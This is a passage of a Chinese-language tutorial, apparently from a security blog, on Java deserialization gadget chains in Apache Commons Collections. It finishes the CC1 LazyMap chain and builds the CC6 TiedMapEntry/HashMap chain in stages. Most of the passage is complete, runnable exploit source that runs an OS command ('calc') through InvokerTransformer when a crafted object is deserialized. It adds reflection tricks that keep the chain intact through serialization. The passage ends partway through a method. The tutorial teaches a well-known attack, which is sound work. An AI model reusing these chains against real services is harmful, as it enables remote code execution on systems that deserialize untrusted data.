        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>


<span class="c1">//        chainedTransformer.transform(Runtime.class);</span>

<span class="c1">//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});</span>

<span class="c1">//        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span>
<span class="c1">//        map.put("value","aaa");</span>
<span class="c1">//        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,chainedTransformer);</span>

<span class="c1">//        for(Map.Entry entry:transformedmap.entrySet()){</span>
<span class="c1">//            entry.setValue(r);</span>
<span class="c1">//        }</span>
<span class="c1">//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");</span>
<span class="c1">//        Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class);</span>
<span class="c1">//        annotationInvocationhdlConstructor.setAccessible(true);</span>
<span class="c1">//        Object o = annotationInvocationhdlConstructor.newInstance(Target.class,transformedmap);</span>


<span class="c1">//设置chainedTransformer在Lazymap中的值</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">Lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>


        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span> <span class="n">annotationInvocationhdlConstructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">InvocationHandler</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Lazymap</span><span class="o">);</span>
<span class="c1">//动态代理</span>
        <span class="n">Map</span> <span class="n">mapProxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">h</span><span class="o">);</span>

        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">mapProxy</span><span class="o">);</span>

        <span class="n">serialize</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>




    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="748cad36e956a0d07a9d73db600ed9f4">CommonsCollections6:</h2>
<h3 data-content="1" id="b96278c418a7759e5b26357fa1c05d60">调用链：</h3>
<p>CC1在jdk的包更新到8u71以后，就对漏洞点进行了修复（<code>CC1TransformedMap</code>链去掉了<code>Map.Entry</code>的<code>setValue</code>方法）（<code>CC1LazyMap</code>使用了<code>put</code>对类进行传参），因为反序列化不仅对类有依赖，还对外部的CC库，以及jdk版本有依赖，所以这里CC1就并不那么兼容，就引入了<code>CC6</code>不受<code>jdk</code>版本的限制：</p>
<p>CC6中引用了<code>HashMap</code>来进行反序列化链子的构造，通过<code>HashMap</code>里面的<code>readObject</code>方法来调用里面的<code>put</code>方法，然后调用hash方法最后调用<code>hashCode</code>方法，如果从<code>hashCode</code>里面能找到的一个调用<code>get</code>的链，就成功了，这样就不会受到jdk版本的限制：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235217-13a4fd7c-20cc-1.png"/></p>
<p>然后我们在TiedMapEntry中找到了hashCode方法，然后调用getValue()方法，然后再通过map调用LazyMap中的get方法</p>
<div class="highlight"><pre><span></span><span class="x">public int hashCode() {</span>
<span class="x">        Object value = getValue();</span>
<span class="x">        return (getKey() == null ? 0 : getKey().hashCode()) ^</span>
<span class="x">               (value == null ? 0 : value.hashCode()); </span>
<span class="x">    }</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="x">private final Map map;</span>
<span class="x">public TiedMapEntry(Map map, Object key) {</span>
<span class="x">        super();</span>
<span class="x">        this.map = map;</span>
<span class="x">        this.key = key;</span>
<span class="x">    }</span>
<span class="x">public Object getValue() {</span>
<span class="x">        return map.get(key);</span>
<span class="x">}</span>
</pre></div>
<p>所以这里我们将TiedMapEntry实例化以后，传入对应的map值为实例化以后的LazyMap，然后再通过Hashmap中的put方法将TiedMapEntry传入。</p>
<h3 data-content="1" id="7d47a76e8079c6921f4a977edc4b4420">EXP问题：</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC6Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>


        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>


        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">Lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>



        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">Lazymap</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>

        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span><span class="s">"bbb"</span><span class="o">);</span>

        <span class="o">;</span>


    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<h4 data-content="1" id="4bcb5a14e42e5b179d5f8bd945ce1a72">问题一：</h4>
<p>因为序列化我们没有必要让他进行命令执行，而hashMap中的put方法会直接调用下去，所以这里我们可以在序列化的时候破环链子的某一个参数，防止他命令执行，然后在执行完put以后再利用反射将参数改回来</p>
<p>这里将LazyMap中对应参数factory要传入的chainedTransformer来进行替换，然后再通过反射将factory的值修改过来：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC6Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>


        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>


        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">Lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>



        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">Lazymap</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>

        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span><span class="s">"bbb"</span><span class="o">);</span>

        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
        <span class="n">Field</span> <span class="n">factoryFied</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"factory"</span><span class="o">);</span>
        <span class="n">factoryFied</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">factoryFied</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Lazymap</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>

        <span class="n">serialize</span><span class="o">(</span><span class="n">map2</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>




    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<h4 data-content="1" id="b3b87940775a0313ea11e9127a774d1f">问题二：</h4>
<p>再进行反序列化我们发现还存在问题，断点调试的时候我们可以发现序列化的时候会进行一步key的操作：在序列化的过程中我们可以发现，if语句是可以进入的，会把<code>TiedMapEntry tiedMapEntry = new TiedMapEntry(Lazymap,"aaa");</code>中的key=“aaa"传入put，所以这里再进行反序列化的时候会因为存在key而进不去if语句从而无法调用到我们想要的factory.transform(key)方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235231-1c44e3ca-20cc-1.png"/></p>
<p>所以我们就可以在put完以后将这个key：aaa删除，让他反序列化的时候还能够进入if语句：</p>
<div class="highlight"><pre><span></span><span class="n">LazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"aaa"</span><span class="o">);</span>
</pre></div>
<h3 data-content="1" id="329006701d0630e98ba8421698d4b59b">EXP(CC6TiedMapEntry)：</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC6Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>


        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>


        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">Lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>



        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">Lazymap</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>

        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span><span class="s">"bbb"</span><span class="o">);</span>
        <span class="n">Lazymap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"aaa"</span><span class="o">);</span>

        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
        <span class="n">Field</span> <span class="n">factoryFied</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"factory"</span><span class="o">);</span>
        <span class="n">factoryFied</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">factoryFied</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Lazymap</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>

        <span class="n">serialize</span><span class="o">(</span><span class="n">map2</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>




    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
